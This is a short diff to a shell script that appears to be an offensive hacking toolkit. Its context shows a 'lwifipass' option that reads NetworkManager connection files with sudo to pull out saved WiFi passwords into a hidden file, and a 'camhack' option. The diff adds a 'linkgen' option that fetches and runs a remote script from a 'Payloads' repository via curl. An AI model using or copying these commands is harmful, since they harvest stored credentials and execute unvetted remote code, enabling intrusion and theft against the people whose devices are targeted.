@@ -32,6 +32,9 @@ lwifipass)
 sudo cat /etc/NetworkManager/system-connections/*|grep "^psk=\|^id=\|^type"|sed '0~3 a\\--+--+--+--+--+--+--+--+--+--+--+--+'|sed '1 i\--+--+--+--+--+--+--+--+--+--+--+--+' >.saved.wifi.pass
 ;;
 
+linkgen)
+source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/linkgen.sh);;
+
 camhack)
 cd $HOME
 if [[ -e $HOME/camhack/run.sh ]]
